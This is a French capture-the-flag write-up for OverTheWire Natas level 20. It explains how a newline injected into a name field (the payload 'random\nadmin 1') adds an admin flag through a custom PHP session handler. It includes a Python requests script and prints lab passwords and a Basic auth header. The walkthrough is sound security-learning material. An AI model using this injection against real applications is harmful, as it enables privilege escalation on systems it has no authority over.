## Connexion (username=natas20 password=slOKYGsjlJhaqKliGvrgWAzln0JyrWao)
```
http://natas20.natas.labs.overthewire.org/
```

## Recherche du mot de passe
session_set_save_handler(
    "myread",     // Appliquée à la lecture (lorsque session_start() est trigger)
    "mywrite",    // Appliquée à l'écriture (A la fin du script)
);

Initialement notre php session id n'a pas de fichier associé donc le premier myread ne fera rien.

C'est mywrite qui va être appelé seulement lors du premier call.

Le mywrite a ce bout de code
```php
foreach($_SESSION as $key => $value){
    $data .= "$key $value\n";
}
```
data est écrit dans notre fichier et récupéré éventuellement pour le myread.
Si les key values ressemblent à ça c'est bingo:
```
name new_username # celui là est obligatoire (new_username est ce qu'on entre dans le champ)
admin 1           # celui là il faudrait l'ajouter
```
Pour faire ca il faudra que data = "name new_username\nadmin 1"

Lors du myread, un split sur les carriege return est fait (\n) puis ensuite un split sur les espaces est fait.
```php
$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") {
        $_SESSION[$parts[0]] = $parts[1];
    }
}
```
Donc parts au début = [name, new_username] ensuite [admin, 1], ainsi le second parts set admin = 1 et print_credentials() affichera le password

mettre un \n dans l'input est impossible
```python
import requests

url = "http://natas20.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMyMDpzbE9LWUdzamxKaGFxS2xpR3ZyZ1dBemxuMEp5cldhbw==",
    "PHPSESSID": "dgq7m29crecmkgkslm4vehjmac"
}
with requests.Session() as session:
    session.headers.update(header)

    # (name random) et (admin 1) sera écrit dans le fichier de ma session php
    payload = {"name":"random\nadmin 1"}
    response = session.post(url, data=payload)

    # On veut ensuite trigger une lecture puisque la première requête n'avait aucun contenu dans le fichier de ma session php
    response = session.post(url)
    print(response.text)
```

## Prochain mot de passe
```
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```